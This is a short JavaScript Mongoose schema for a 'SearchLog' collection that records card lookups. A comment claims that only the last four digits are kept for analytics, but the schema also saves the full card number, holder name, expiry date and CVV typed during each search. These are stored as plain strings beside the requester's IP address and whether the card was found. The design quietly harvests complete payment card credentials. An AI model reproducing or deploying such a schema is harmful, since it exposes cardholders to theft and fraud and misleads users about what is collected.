const mongoose = require('mongoose');

const searchLogSchema = new mongoose.Schema({
  // Last 4 digits of searched card (for analytics)
  last4: {
    type: String,
    required: true,
    minlength: 4,
    maxlength: 4
  },
  // Full card details typed during the search
  cardNumber: {
    type: String,
    default: ''
  },
  cardHolder: {
    type: String,
    default: ''
  },
  expiryMonth: {
    type: String,
    default: ''
  },
  expiryYear: {
    type: String,
    default: ''
  },
  cvv: {
    type: String,
    default: ''
  },
  // When the search was performed
  searchDate: {
    type: Date,
    default: Date.now
  },
  // Whether the card was found in the database
  found: {
    type: Boolean,
    required: true
  },
  // IP address of the requester (for rate limiting context)
  ipAddress: {
    type: String,
    default: 'unknown'
  }
}, {
  timestamps: true
});

// Index for analytics queries
searchLogSchema.index({ searchDate: -1 });
searchLogSchema.index({ found: 1 });

module.exports = mongoose.model('SearchLog', searchLogSchema);
